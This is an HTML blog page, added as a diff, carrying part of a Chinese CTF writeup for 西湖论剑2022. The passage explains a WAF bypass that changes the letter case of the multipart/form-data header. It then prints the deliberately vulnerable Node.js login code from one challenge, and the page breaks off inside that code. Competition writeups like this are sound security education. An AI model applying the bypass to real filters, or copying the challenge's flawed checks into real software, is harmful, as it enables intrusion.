@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="这次西湖的题量对于人数较少的队伍来说还是蛮多的，感觉题目蛮魔幻的，做出来就感觉是非预期出的（量子态西湖）比赛ban的挺严的说，不过收获还是蛮大的，也给队伍出了不少力，累挺~~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑2022部分Writeup及复现">
+<meta property="og:url" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="TWe1v3">
+<meta property="og:description" content="这次西湖的题量对于人数较少的队伍来说还是蛮多的，感觉题目蛮魔幻的，做出来就感觉是非预期出的（量子态西湖）比赛ban的挺严的说，不过收获还是蛮大的，也给队伍出了不少力，累挺~~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203182455930.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203203311993.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203204849857.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213649385.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213905343.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203234858467.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204010131847.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012341032.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012907656.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013112977.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013306754.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013605153.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014151419.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014430184.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204020134877.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031119995.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031253040.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031314258.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031344112.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204032727182.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204033851762.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034628556.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034838826.png">
+<meta property="og:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204035735656.png">
+<meta property="article:published_time" content="2023-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-02-03T20:01:29.528Z">
+<meta property="article:author" content="TWe1v3">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203182455930.png">
+
+
+<link rel="canonical" href="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/","path":"西湖论剑2022--部分Writeup及复现/","title":"西湖论剑2022部分Writeup及复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>西湖论剑2022部分Writeup及复现 | TWe1v3</title>
+  
+
+
+
+
+
+<script src="/lib/fireworks.js"></script>
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TWe1v3</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text"> #Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AD%E8%BD%AC%E4%B9%BE%E5%9D%A4"><span class="nav-number">1.1.</span> <span class="nav-text"> 扭转乾坤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 题目描述：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#node-magical-login"><span class="nav-number">1.2.</span> <span class="nav-text"> Node Magical Login</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="nav-number">1.2.1.</span> <span class="nav-text"> 题目描述：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-2"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unusual-php"><span class="nav-number">1.3.</span> <span class="nav-text"> unusual php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-3"><span class="nav-number">1.3.1.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#real_ez_node"><span class="nav-number">1.4.</span> <span class="nav-text"> real_ez_node</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-4"><span class="nav-number">1.4.1.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text"> #Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E"><span class="nav-number">2.1.</span> <span class="nav-text"> 机你太美</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-5"><span class="nav-number">2.1.1.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="nav-number">3.</span> <span class="nav-text"> #写在后面</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="TWe1v3"
+      src="/images/twe1v3.gif">
+  <p class="site-author-name" itemprop="name">TWe1v3</p>
+  <div class="site-description" itemprop="description">TWe1v3的博客</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/weixin_44450575" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44450575" rel="noopener" target="_blank">sight's CSDN</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.coolcalo.top/" title="http:&#x2F;&#x2F;www.coolcalo.top&#x2F;" rel="noopener" target="_blank">coolcalo'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.t0mrvvi1b3t.top/" title="http:&#x2F;&#x2F;www.t0mrvvi1b3t.top&#x2F;" rel="noopener" target="_blank">t0mr'blog</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/twe1v3.gif">
+      <meta itemprop="name" content="TWe1v3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TWe1v3">
+      <meta itemprop="description" content="TWe1v3的博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="西湖论剑2022部分Writeup及复现 | TWe1v3">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          西湖论剑2022部分Writeup及复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-02-01 00:00:00" itemprop="dateCreated datePublished" datetime="2023-02-01T00:00:00+08:00">2023-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-02-04 04:01:29" itemprop="dateModified" datetime="2023-02-04T04:01:29+08:00">2023-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E4%BA%8BWriteup/" itemprop="url" rel="index"><span itemprop="name">赛事Writeup</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>10k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>这次西湖的题量对于人数较少的队伍来说还是蛮多的，感觉题目蛮魔幻的，做出来就感觉是非预期出的（量子态西湖）比赛ban的挺严的说，不过收获还是蛮大的，也给队伍出了不少力，累挺~~</p>
+<span id="more"></span>
+<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> #Web</h1>
+<h2 id="扭转乾坤"><a class="markdownIt-Anchor" href="#扭转乾坤"></a> 扭转乾坤</h2>
+<h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述：</h3>
+<p>在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务</p>
+<h3 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h3>
+<p>这题做的很玄幻，一开始以为需要什么特殊的上传姿势，但是全都<code>403 Forbidden</code>,仔细审了一下题，考点估计就在中间件了。</p>
+<p>简单试探了一下，发现</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203182455930.png" alt="扭转乾坤01"></p>
+<p>发现<code>multipart/form-data</code>被ban了，有很明显的提示的意思，试着去查阅的<code>multipart/form-data</code>相关的知识点，就找到一篇这样的文章</p>
+<p>在文章里发现了对于Java来说，⽀持参数名的⼤⼩写不敏感的写法。而HTTP协议中的<code>Content-Type</code>头部信息是大小写不敏感的，所以可以对<code>multipart/form-data</code>大小写bypass</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203203311993.png" alt="扭转乾坤02"></p>
+<h2 id="node-magical-login"><a class="markdownIt-Anchor" href="#node-magical-login"></a> Node Magical Login</h2>
+<h3 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述：</h3>
+<p>一个简单的用nodejs写的登录站点（貌似暗藏玄机）</p>
+<h3 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程：</h3>
+<p>这题给了源码，<strong>controller.js</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span 